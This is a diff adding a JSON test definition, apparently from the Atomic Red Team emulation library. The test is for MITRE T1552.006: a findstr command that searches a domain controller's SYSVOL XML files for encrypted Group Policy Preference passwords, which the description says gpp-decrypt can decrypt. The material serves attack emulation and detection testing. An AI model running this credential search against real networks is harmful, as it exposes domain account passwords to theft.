@@ -1,0 +1,30 @@
+{
+    "name": "GPP Passwords (findstr)",
+    "description": "Look for the encrypted cpassword value within Group Policy Preference files on the Domain Controller. This value can be decrypted with gpp-decrypt on Kali Linux. ",
+    "supported_platforms": [
+        "windows"
+    ],
+    "dependency_executor_name": "powershell",
+    "executor": {
+        "command": "findstr /S cpassword %logonserver%\\sysvol\\*.xml\n",
+        "name": "command_prompt",
+        "type": "Command Executor"
+    },
+    "id": "T1552.006",
+    "tactics": [
+        "Credential Access"
+    ],
+    "technique": "Group Policy Preferences",
+    "source": "ART",
+    "uuid": "870fe8fb-5e23-4f5f-b89d-dd7fe26f3b5f",
+    "arguments": null,
+    "preconditions": [
+        {
+            "description": "Computer must be domain joined\n",
+            "prereq_command": "if((Get-CIMInstance -Class Win32_ComputerSystem).PartOfDomain) {exit 0} else {exit 1}\n",
+            "get_prereq_command": "Write-Host Joining this computer to a domain must be done manually\n"
+        }
+    ],
+    "infrastructure_requirement": [],
+    "side": "Victim"
+}
